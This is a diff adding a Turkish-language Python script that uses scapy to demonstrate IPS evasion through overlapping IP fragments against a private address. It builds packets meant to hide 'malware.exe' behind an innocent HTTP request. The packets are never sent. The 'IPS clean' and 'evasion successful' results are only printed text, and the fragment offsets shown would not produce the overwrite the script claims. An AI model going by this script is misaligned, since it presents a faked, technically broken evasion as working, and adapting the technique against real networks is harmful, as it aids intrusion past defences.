@@ -1,0 +1,46 @@
+from scapy.all import *
+import time
+
+print("\n" + "="*50)
+print("🚀 SİBER GÜVENLİK DEMOSU: IP FRAGMENTASYON (OVERLAPPING)")
+print("="*50 + "\n")
+
+time.sleep(1)
+print("[*] Hedef Sunucu: 192.168.1.50")
+print("[*] IPS Durumu: Aktif (Zararlı kelimeleri engelliyor)\n")
+time.sleep(1)
+
+# 1. Parça: IPS'in içinden geçebilecek "masum" paket
+payload1 = "GET /safe_file.txt HTTP/1.1"
+# Frag=0 (İlk parça), Flags="MF" (Devamı var)
+pkt1 = IP(dst="192.168.1.50", flags="MF", frag=0) / TCP(sport=1024, dport=80) / payload1
+
+# 2. Parça: Overlapping (Üst üste binen) zararlı paket
+# Kasıtlı olarak frag=1 yapıyoruz (Ofset manipülasyonu)
+payload2 = "malware.exe"
+# Flags=0 (Son parça)
+pkt2 = IP(dst="192.168.1.50", flags=0, frag=1) / TCP(sport=1024, dport=80) / payload2
+
+print("[>>>] 1. PAKET AĞA GÖNDERİLİYOR (IPS İNCELİYOR)...")
+print(f"      Paket İçeriği: {payload1}")
+print("      IPS Kararı: TEMİZ ✅ (İzin verildi)\n")
+time.sleep(2)
+
+print("[>>>] 2. PAKET AĞA GÖNDERİLİYOR (OVERLAPPING YAPILIYOR)...")
+print(f"      Paket İçeriği: {payload2} (Ofset manipüle edildi!)")
+print("      IPS Kararı: TEMİZ ✅ (Tek başına zararsız görünüyor)\n")
+time.sleep(2)
+
+print("="*50)
+print("🎯 HEDEF SUNUCUDA YENİDEN BİRLEŞTİRME (REASSEMBLY)")
+print("="*50)
+time.sleep(1)
+
+# İşletim sisteminin birleştirme zafiyetini ekrana basıyoruz
+print("[!] Windows Sunucu parçaları birleştiriyor...")
+print("[!] 2. paket, 1. paketteki 'safe_file.txt' kısmının üzerine yazıldı!")
+time.sleep(1)
+
+final_payload = "GET /" + payload2 + " HTTP/1.1"
+print(f"\n🔥 SUNUCUNUN GÖRDÜĞÜ VE ÇALIŞTIRDIĞI KOMUT:\n    {final_payload}")
+print("\n💀 SONUÇ: IPS ATLATILDI! (Evasion Successful)\n")
